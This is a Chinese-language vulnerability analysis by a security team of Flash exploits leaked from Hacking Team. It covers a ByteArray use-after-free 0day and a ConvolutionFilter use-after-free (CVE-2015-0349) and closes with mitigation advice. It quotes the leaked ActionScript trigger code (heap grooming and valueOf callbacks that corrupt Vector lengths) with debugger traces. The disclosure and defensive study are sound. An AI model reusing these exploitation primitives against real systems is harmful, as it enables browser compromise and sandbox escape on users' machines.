# Hacking Team攻击代码分析

作者：360Vulcan Team成员Yuki Chen

攻击代码分析Part 1: Flash 0day
========================

0x00 前言
=====

最近专门提供通过攻击手法进行网络监听的黑客公司Hacking Team被黑，包含该公司的邮件、文档和攻击代码的400G数据泄漏。360Vulcan Team第一时间获取了相关信息，并对其中的攻击代码进行了分析。

我们发现其中至少包含了两个针对Adobe Flash的远程代码执行漏洞和一个针对微软Windows内核字体权限提升漏洞的完整攻击代码（exploit）。其中一个Flash漏洞已经在今年4月修补，其他两个漏洞都未修复。

其中Flash漏洞exploit被设计为可以针对IE、Chrome浏览器和Office软件进行攻击。攻击者通过嵌入精心构造的恶意Flash文件到网页或Office文档中，使得访问特定网页或打开Office文档的用户感染恶意代码。同时，这些恶意代码通过结合Windows内核字体权限提升漏洞，可以绕过IE（保护模式或增强保护模式）、Chrome（Chrome Sandbox，< Chrome 43)和Office（保护模式）的沙盒保护，完全控制用户的电脑。

360Vulcan Team对这些漏洞进行分析，并分为三个部分将这些0day的信息共享给安全社区，希望软件厂商和安全厂商共同行动，尽快修补和防御着这些“在野”的0day漏洞。

Flash 0day -ActionScript ByteArray Buffer Use After Free

看起来HackingTeam的远程exploit工具中广泛使用了同一个flash漏洞（攻击目标可以是IE、Chrome、Office系列）:

![enter image description here](http://drops.javaweb.org/uploads/images/ef0a1c4d229636d3c965c952f870f621d761ae1a.jpg)

初步分析这个Exploit之后，我们发现这个Exploit在最新版本的Adobe Flash（18.0.0.194）中仍然可以触发，因此这应该是一个0day漏洞。

0x01 漏洞原理分析
=====

这个漏洞成因在于，Flash对ByteArray内部的buffer使用不当，而造成Use After Free漏洞。

我们来看一下HackingTeam泄露的exploit代码，关键部分如下：

**1 定义ByteArray**

```
for(var i:int; i < alen; i+=3){
                    a[i] = new Class2(i);

                    a[i+1] = new ByteArray();
                    a[i+1].length = 0xfa0;

                    a[i+2] = new Class2(i+2);
                }

```

首先定义一系列的ByteArray，这些ByteArray初始大小被设置成0xfa0，ActionScript内部会为每个Buffer分配0x1000大小的内存。

**2 给ByteArray元素赋值：**

```
_ba = a[i];
                    // call valueOf() and cause UaF memory corruption 
                    _ba[3] = new Clasz();

```

这一步是触发漏洞的关键，由于ByteArray的元素类型是Byte，当把Clasz类赋值给ByteArray[3](http://drops.javaweb.org/uploads/images/af29e9bb96f254ba324bce79d7261cfa904a6dae.jpg)时，AVM会试图将其转化为Byte，此时Clasz的valueOf函数将被调用：

```
prototype.valueOf = function()
        {
            ref = new Array(5);
            collect.push(ref);

            // realloc
            _ba.length = 0x1100;

            // use after free
            for (var i:int; i < ref.length; i++)
                ref[i] = new Vector.<uint>(0x3f0);

            return 0x40
        }

```

在valueOf函数中，最关键的一部是更改了ByteArray的长度，将其设置成为0x1100，这个操作将会触发ByteArray内部buffer的重新分配，旧的buffer（大小为0x1000）将会被释放。紧接着exploit代码会分配若干个vector对象，每个vector同样占用0x1000字节的内存，试图去重新使用已经释放的ByteArray buffer的内存。

valueOf函数返回0x40，然后0x40会被写入`buffer[3]`这里，如果逻辑正确，那么此处应该写入的是新分配的buffer；然而由于代码漏洞，这里写入的已经释放的0x1000大小的旧buffer，于是事实上写入的是vector对象的头部，整个过程如下：

1 ByteArray创建并设置长度0xfe0:

```
old buffer      |                                               |
                0                                               0x1000

```

2 设置`_ba[3]`，调用valueOf，在valueOf中设置ByteArray.length = 0x1100，此时old buffer被释放

```
old buffer (Freed)      |                                               |
                        0                                               0x1000

```

3 然后0x1000大小的vector占据old buffer内存，前4个字节是vector的长度字段：

```
Vector                  | f0 03 00 00                          |
                        0                                       0x1000

```

4 valueOf返回0x40，0x40被写入`buffer[3]`，由于UAF漏洞的存在，写入的是vector的size字段：

```
Vector                  | f0 03 00 40                           |
                        0                                       0x1000

```

于是我们可以得到一个超长的vector对象：

![enter image description here](http://drops.javaweb.org/uploads/images/b3b226bdae419299e1ab0f0358ab8a4407630ac2.jpg)

我们可以通过调试来观察漏洞的触发过程：

1 调用valueOf之前

```
0:005> u
671cf2a5    call     671b0930   //这里最终调用valueOf 
671cf2aa 83c404          add     esp,4
671cf2ad 8806            mov     byte ptr [esi],al
671cf2af 5e              pop     esi

```

此时esi指向old buffer:

```
0:005> dd esi-3
0dfd5000  00000000 00000000 00000000 00000000
0dfd5010  00000000 00000000 00000000 00000000

```

2 调用valueOf之后，old buffer被释放，然后被vector占据：

```
0:005> p
671cf2aa 83c404          add     esp,4

```

此时esi已经指向新分配的vector，就buffer已经被释放

```
0:005> dd esi-3
0dfd5000  000003f0 0d2b3000 00000000 00000000
0dfd5010  00000000 00000000 00000000 00000000
0dfd5020  00000000 00000000 00000000 00000000
0dfd5030  00000000 00000000 00000000 00000000
0dfd5040  00000000 00000000 00000000 00000000
0dfd5050  00000000 00000000 00000000 00000000
0dfd5060  00000000 00000000 00000000 00000000
0dfd5070  00000000 00000000 00000000 00000000

```

3 写入`buffer[3]`

接下来valueOf的返回值0x40被写入`buffer[3]`（及vector.size字段）：

```
0:005> p
eax=00000040 ebx=0d8b4921 ecx=00000206 edx=00000006 esi=0dfd5003 edi=0d362020
eip=671cf2ad esp=04f2ceec ebp=04f2d050 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
Flash32_18_0_0_194!IAEModule_IAEKernel_UnloadModule+0x1ba07d:
671cf2ad 8806            mov     byte ptr [esi],al          ds:0023:0dfd5003=00
0:005> p
Flash32_18_0_0_194!IAEModule_IAEKernel_UnloadModule+0x1ba07f:
671cf2af 5e              pop     esi
0:005> dd esi-3
0dfd5000  400003f0 0d2b3000 00000000 00000000
0dfd5010  00000000 00000000 00000000 00000000
0dfd5020  00000000 00000000 00000000 00000000
0dfd5030  00000000 00000000 00000000 00000000

```

可以看到vector的长度以及被修改成0x400003f0。

0x02 漏洞防范
=====

由于该漏洞利用非常稳定，而Adobe暂时没有发布该漏洞的补丁，更可怕的是从HackingTeam泄露的数据来看，该exploit还带有沙盒突破提权功能，危害甚大。我们建议补丁发布之前，可以暂时先禁用flash插件；也可以开启Chrome或Chrome核心浏览器针对插件的Click-to-Run功能，来缓解Flash 0day的攻击。

攻击代码分析Part 2: 一个Pwn2Own漏洞的奇幻漂流
==============================

0x00 前言
=====

之前我们分析了HackingTeam泄露数据中的Flash 0day (bytearray 0day)。而在泄露数据中我们还看到了另外一个名为convolution_filter的flash exploit。

看了一下这个flash exploit，很快意识到这个漏洞是一个已经修补的漏洞cve-2015-0329，在今年4月份被修补，这也解释了readme文档中，flash后面加了“（April 2015）”，意思是这个洞只能用到今年4月之前的flash版本中：

(https://helpx.adobe.com/cn/security/products/flash-player/apsb15-06.html)

这个漏洞有个不平凡的故事，今年的Pwn2Own大赛中，前Vupen主力Nicolas Joly正是用这个漏洞拿下了64位Flash插件：

![enter image description here](http://drops.javaweb.org/uploads/images/af29e9bb96f254ba324bce79d7261cfa904a6dae.jpg)

所以事情就变得很有趣了，一边是Nico用这个漏洞打 Pwn2Own，另一边HackingTeam（从常理推测，应该是通过其它渠道，和Nico无关）也掌握了这个漏洞并将其用于自己的Exploit工具包中。

0x01 CVE-2015-0349原理分析
=====

再回头看一下CVE-2015-0349这个漏洞，这是一个ActionScript 3中ConvolutionFilter类的内部matrix数组的一个Use After Free漏洞，这是个非常好用的漏洞，在32位和64位上都可以轻松实现稳定利用。

我们来看一下HackingTeam泄露的exploit代码，关键部分如下：

1 创建ConvolutionFilter对象：

```
// try to allocate two sequential pages of memory: [ matrix ][ MyClass2 ]
                for(i=20; i < alen; i+=6){
                    a[i] = new Class2(i);

                    for(j=i+1; j < i+5; j++)
                        a[j] = new ConvolutionFilter(14,15);

                    a[i+5] = new Class2(i+5);
                }

```

2 设置ConvolutionFilter.matrix

```
var m:Array = new Array(bLen);
m[0] = new Clasz;   
m[1] = m[0];

try { filter.matrix = m; } catch (e:Error){}

```

这里有一个关键点，filter.matrix被赋值为m（类型是 Array），而Array m的第一个元素是一个Clasz类，而Clasz类定义了valueOf方法，这个valueOf是漏洞触发的关键点：

```
#c++
public class Clasz 
    {
        …
        public function Clasz() {   }

        prototype.valueOf = function()
        {
…
}

```

3 在Clasz的valueOf函数中，设置ConvolutionFilter.matrixX：

```
prototype.valueOf = function()
        {
            if (filter.matrixX > 14) throw new Error(""); // check for the second valueOf() call

            ref = new Array(5);
            collect.push(ref); // protect from GC // for RnD

            filter.matrixX = 15; // reallocate filter matrix

            // reuse freed memory
            for(var i:int; i < ref.length; i++) {
                ref[i] = new Vector.<uint>;
                ref[i].length = bLen;
            }

            // return value for vector length overwriting
            return 2; // = 0x40000000 as single precision

        }

```

事实上filter.matrixX = 15执行完毕之后，ConvolutionFilter内部的一个float数组（我们叫他matrixArray）就会被释放，而从valueOf返回之后，已经释放的matrixArray还会继续被使用，并且往里面写入数据，从而造成了Use-After-Free。我们可以看到valueOf函数中，在设置了filter.matrixX之后，分配了一系列的vector，这些vector就是用来占用释放后的matrixArray的内存的。这样当程序继续往被释放后的matrixArray里写数据时，实际上是在往vector对象里面写数据，从而达到修改vector长度字段的目的，便于进一步exploit。

0x02 细节分析
=====

我们首先先介绍一下ConvolutionFilter的关键结构：

```
ConvolutionFilterObject {
+10 ConvolutionFilter {
    +14     int matrixX;
    +18     int matrixY;
    +1C     float *matrixArray;
+20     int matrixLength;
}
}

```

ConvolutionFilter里面有成员存放matrix矩阵，matrixX和matrixY代表矩阵的x和y，matrixArray是动态分配的数组，其大小是由matrixX和matrixY决定的，关系如下：

```
matrixArray = alloc( matrixX * matrix * sizeof(float) )

```

当matrixX和matrixY改变时，如果原来的matrixArray大小不足以容纳现在的容量，则旧的matrixArray会被释放，然后分配新的matrixArray （UAF就是这么来的） 当exploit代码创建ConvolutionFilter时，传入的参数是matrixX=14，matrix=15： a[j] = new ConvolutionFilter(14,15); 因此matrixArray初始大小为`14 * 15 * 4 = 840`，然后我们看一下第二步，执行

```
try { filter.matrix = m; } catch (e:Error){}

```

时发生了什么： ConvolutionFilter::set_matrix基本上是直接调用了另外一个函数，我们叫他set_matrix_internal:

```
.text:102E9604 loc_102E9604:                           ; CODE XREF: sub_102E95ED+Aj
.text:102E9604                 push    14h
.text:102E9606                 lea     eax, [esi+24h]
.text:102E9609                 push    eax
.text:102E960A                 mov     eax, [esi+8]
.text:102E960D                 mov     ecx, [eax+4]
.text:102E9610                 or      edi, 1
.text:102E9613                 push    edi
.text:102E9614                 call    set_matrix_internal

```

调用该函数时参数如下：

```
set_matrix_internal( paramArray,  matrixArray,  matrixLength )

```

这里的关键点是：matrixArray直接作为参数被传入。我们来看一下set_matrix_internal函数，该函数的功能可以描述为：将paramArray（在exploit里面就是m这个数组）里面的每一项赋值给matrixArray中对应的项，由于matrixArray的类型为float *，因此如果有必要的话得把paramArray中的元素转换成float，对应逻辑的伪代码如下:

```
for ( i = 0; I < matrixLength; ++ i ) {
matrixArray[i] = (float)ConvertToNumber(paramArray.get(i));
}

```

还记得我们的`m[0]`被设置成一个Clasz对象了吗？

```
m[0] = new Clasz;   

```

将Clasz对象转换成Number的过程中，会调用Clasz对象的valueOf函数，而前面已经讲过，valueOf函数会设置filter.matrixX=15（原来的matrixX为14），此时由于matrixArray大小不够，于是旧的matrixArray被释放，新的matrixArray被分配。然后从valueOf返回到set_matrix_internal以后，程序继续向matrixArray里面写入值，注意这里用的还是旧的 matrixArray，于是UAF漏洞就这样产生了。

又是valueOf
---------

如果你看过我们前一篇分析bytearray 0day的文章，你可能对valueOf这个函数依然印象深刻。事实上这两个洞无论是从产生原理，还是利用方式来讲都非常的相近。背后隐藏的逻辑是脚本语言从native code回调到脚本层（通过toString, valueOf, event等等），还是很容易出现没处理好而造成UAF等情况的发生。类似case已经在chrome, IE, flash, java等等软件中多次出现，有心的读者可以去留意一下。事实上这也是脚本语言漏洞挖掘中的一个值得切入的点。

0x03 漏洞防范
=====

由于Adobe官方已针对此漏洞发布了安全更新，用户只要及时升级就可避免受此漏洞影响。